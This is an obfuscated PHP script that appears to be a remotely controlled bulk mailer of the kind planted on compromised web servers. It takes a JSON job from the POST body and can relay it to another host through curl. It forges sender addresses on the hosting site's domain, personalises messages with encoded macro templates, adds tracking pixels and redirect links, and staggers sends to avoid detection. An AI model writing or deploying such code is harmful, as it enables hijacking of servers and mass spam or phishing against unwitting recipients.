<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp412b97) { if ($sp412b97 == 'keys') { return array_keys($this->_keys); } } public function Import($sp412b97, $sp08567e) { if (is_array($sp08567e)) { $this->values[$sp412b97] = array(); foreach ($sp08567e as $spd1fa8b) { if (!empty($spd1fa8b['key'])) { $this->values[$sp412b97][$spd1fa8b['key']] = $spd1fa8b['value']; } else { $this->values[$sp412b97][] = $spd1fa8b['value']; } } } else { $this->Assign($sp412b97, $sp08567e); } } public function Assign($sp412b97, $spe73b6f) { $this->values[$sp412b97] = $spe73b6f; } public function Parse($spe9fcd9) { $spbf8b24 = ''; $sp4636d0 = 0; while (true) { $sp00e5e1 = strpos($spe9fcd9, '{', $sp4636d0); if ($sp00e5e1 === false) { $spbf8b24 .= substr($spe9fcd9, $sp4636d0); break; } $spbf8b24 .= substr($spe9fcd9, $sp4636d0, $sp00e5e1 - $sp4636d0); $sp4636d0 = $sp00e5e1 + 1; $sp2b0757 = ''; $sp96dba7 = '{'; $sp12b90e = array(); $sp1207ca = false; $sp003355 = false; $spa82f6d = 'var'; while ($sp4636d0 < strlen($spe9fcd9)) { $sp9a5042 = substr($spe9fcd9, $sp4636d0, 1); $sp96dba7 .= $sp9a5042; if ($sp9a5042 == ',' || $sp9a5042 == '>' || $sp9a5042 == '|') { if ($spa82f6d == 'alias') { $sp1207ca = $sp2b0757; } elseif ($spa82f6d == 'mod') { $sp003355 = $sp2b0757; } else { $sp12b90e[] = $sp2b0757; } $sp2b0757 = ''; if ($sp9a5042 == '>') { $spa82f6d = 'alias'; } if ($sp9a5042 == '|') { $spa82f6d = 'mod'; } $sp4636d0++; continue; } if ($sp9a5042 == '}') { if ($spa82f6d == 'alias') { $sp1207ca = $sp2b0757; } elseif ($spa82f6d == 'mod') { $sp003355 = $sp2b0757; } else { $sp12b90e[] = $sp2b0757; } $sp4636d0++; break; } $sp2b0757 .= $sp9a5042; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp9a5042) == 0) { $sp4636d0++; $sp12b90e = array(); break; } $sp4636d0++; } if (sizeof($sp12b90e) == 0) { $spbf8b24 .= $sp96dba7; continue; } $sp7f1887 = false; $sp27a919 = false; if (preg_match('/^\\^/', $sp12b90e[0]) > 0) { $sp12b90e[0] = substr($sp12b90e[0], 1); $sp7f1887 = true; } if (preg_match('/^\\!/', $sp12b90e[0]) > 0) { $sp12b90e[0] = substr($sp12b90e[0], 1); $sp27a919 = true; } $spae1e18 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp12b90e[0], $spf17125) > 0) { $spae1e18 = $spf17125[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp12b90e[0], $spf17125) > 0) { $spae1e18 = explode('-', $spf17125[1]); } if ($spae1e18 !== false) { $sp12b90e[0] = substr($sp12b90e[0], 0, strpos($sp12b90e[0], '[')); } $this->_keys[$sp12b90e[0]] = true; if (empty($this->values[$sp12b90e[0]]) && empty($this->fixed[$sp12b90e[0]])) { continue; } if ($sp7f1887) { unset($this->fixed[$sp12b90e[0]]); } if (isset($this->fixed[$sp12b90e[0]])) { $spe50b2c = $this->fixed[$sp12b90e[0]]; } else { $spe50b2c = ''; $spcf985b = 1; if (sizeof($sp12b90e) == 2) { $spcf985b = $sp12b90e[1]; } if (sizeof($sp12b90e) == 3) { $spcf985b = rand($sp12b90e[1], $sp12b90e[2]); } for ($spe1cc88 = 0; $spe1cc88 < $spcf985b; $spe1cc88++) { if (is_array($this->values[$sp12b90e[0]])) { if (!is_array($this->used[$sp12b90e[0]])) { $this->used[$sp12b90e[0]] = array(); } if (count($this->used[$sp12b90e[0]]) == count($this->values[$sp12b90e[0]])) { $this->used[$sp12b90e[0]] = array(); } if ($spae1e18 !== false && is_scalar($spae1e18)) { $spe50b2c .= $this->values[$sp12b90e[0]][$spae1e18]; $this->used[$spae1e18] = true; } else { $sp7e27ba = array(); if (is_array($spae1e18)) { $sp8c5268 = $spae1e18[0]; $spcbf155 = $spae1e18[1]; } else { $sp8c5268 = 0; $spcbf155 = count($this->values[$sp12b90e[0]]) - 1; } for ($spd06e24 = $sp8c5268; $spd06e24 <= $spcbf155; $spd06e24++) { if ($sp27a919 && !empty($this->used[$sp12b90e[0]][$spd06e24])) { continue; } $sp7e27ba[] = $spd06e24; } $spf3fae1 = $sp7e27ba[rand(0, count($sp7e27ba) - 1)]; $this->used[$sp12b90e[0]][$spf3fae1] = true; $spe50b2c .= $this->values[$sp12b90e[0]][$spf3fae1]; } } else { $spe50b2c .= $this->values[$sp12b90e[0]]; } } } $spe50b2c = $this->Parse($spe50b2c); if ($sp003355 !== false) { for ($spa953d2 = 0; $spa953d2 < strlen($sp003355); $spa953d2++) { switch (substr($sp003355, $spa953d2, 1)) { case 'b': $spe50b2c = base64_encode($spe50b2c); break; case 'q': $spe50b2c = quoted_printable_encode($spe50b2c); break; default: break; } } } if ($sp7f1887) { $this->fixed[$sp12b90e[0]] = $spe50b2c; } if ($sp1207ca !== false && $sp1207ca != '') { $this->fixed[$sp1207ca] = $spe50b2c; } $spbf8b24 .= $spe50b2c; } return $spbf8b24; } } $sp935d9d = file_get_contents('php://input'); $sp409afd = json_decode($sp935d9d, true); if (empty($sp409afd['via_proxy'])) { $sp409afd['via_proxy'] = true; $sp633597 = curl_init($sp409afd['prefix'] . $sp409afd['files']['s']); $sp3e5513 = json_encode($sp409afd); curl_setopt($sp633597, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp633597, CURLOPT_TIMEOUT, 600); curl_setopt($sp633597, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp633597, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp633597, CURLOPT_REFERER, $spcc6a00); curl_setopt($sp633597, CURLOPT_POST, true); curl_setopt($sp633597, CURLOPT_POSTFIELDS, $sp3e5513); curl_setopt($sp633597, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp3e5513))); $sp673c39 = curl_exec($sp633597); echo $sp673c39; die; } $sp40a7a5 = $_SERVER['SERVER_ADDR']; $sp29bc19 = $_SERVER['HTTP_HOST']; $sp29bc19 = preg_replace('/^www\\./', '', $sp29bc19); $sp118cf2 = new Macros(); $sp118cf2->Assign('server_addr', $sp40a7a5); $sp118cf2->Assign('server_host', $sp29bc19); foreach ($sp409afd['macros'] as $sp412b97 => $sp08567e) { $sp118cf2->Import($sp412b97, $sp08567e); } $spc02c11 = preg_replace('/^www\\./i', '', $sp29bc19); $sp3739a7 = $sp118cf2->Parse('{from_user}@' . $spc02c11); $sp118cf2->Assign('from_email', $sp3739a7); $sp118cf2->Assign('prefix', $sp409afd['prefix']); $sp118cf2->Assign('html', $sp409afd['letter']['html']); $sp4636d0 = 0; $spae8dca = 0; $sp18ef5f = 0; $sp590e77 = array(); foreach ($sp409afd['rcpt'] as $spff97f2) { $sp118cf2->Assign('email', $spff97f2['email']); $sp118cf2->Assign('entry', $spff97f2); $sp118cf2->Assign('date', date('r')); $sp118cf2->Assign('redirect', $sp409afd['prefix'] . $sp409afd['files']['r']); $sp118cf2->Assign('redirect_with_uri', $sp409afd['prefix'] . $sp409afd['files']['r'] . '?uri='); $sp118cf2->Assign('unsubscribe', $sp409afd['prefix'] . $sp409afd['files']['u'] . '?id=' . $spff97f2['id']); $sp118cf2->Assign('delivery', '<img src="' . $sp409afd['prefix'] . $sp409afd['files']['d'] . '?id=' . $spff97f2['id'] . '" />'); $sp0e8619 = $sp118cf2->Parse($sp409afd['envelope']['header']); $sp6d8461 = $sp118cf2->Parse($sp409afd['envelope']['body']); if (!empty($spff97f2['name'])) { $sp604fdc = $spff97f2['name'] . ' <' . $spff97f2['email'] . '>'; } else { $sp604fdc = $spff97f2['email']; } $sp65a86e = $sp118cf2->Parse($sp409afd['letter']['subject']); if ($sp4636d0 > 0) { sleep(rand(3, 8)); } $spad08c4 = mail($sp604fdc, $sp65a86e, $sp6d8461, $sp0e8619); $sp590e77[$spff97f2['id']] = $spad08c4; if ($spad08c4) { $spae8dca++; } else { $sp18ef5f++; } $sp4636d0++; } echo serialize(array('total' => count($sp409afd['rcpt']), 'sent' => $sp4636d0, 'success' => $spae8dca, 'error' => $sp18ef5f, 'rcpt' => $sp590e77));